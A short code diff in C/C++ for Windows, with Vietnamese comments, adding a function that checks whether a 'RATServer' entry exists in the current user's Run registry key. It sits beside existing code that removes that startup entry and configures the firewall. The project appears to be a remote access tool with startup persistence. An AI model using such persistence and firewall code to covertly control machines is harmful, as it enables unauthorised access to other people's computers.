@@ -112,6 +112,23 @@ bool RemoveStartup() {
     return (result == ERROR_SUCCESS);
 }
 
+// [MỚI] Hàm kiểm tra xem Startup đã được cài đặt chưa
+bool CheckStartupExists() {
+    HKEY hKey;
+    // 1. Mở khóa Registry Run của User hiện tại
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) {
+        return false;
+    }
+
+    // 2. Kiểm tra xem giá trị RATServer có tồn tại không
+    char buffer[MAX_PATH];
+    DWORD bufferSize = MAX_PATH;
+    long result = RegQueryValueExA(hKey, "RATServer", NULL, NULL, (LPBYTE)buffer, &bufferSize);
+
+    RegCloseKey(hKey);
+    return (result == ERROR_SUCCESS);
+}
+
 void SetupFirewall() {
     char path[MAX_PATH];
     // 1. Lấy đường dẫn file .exe hiện tại
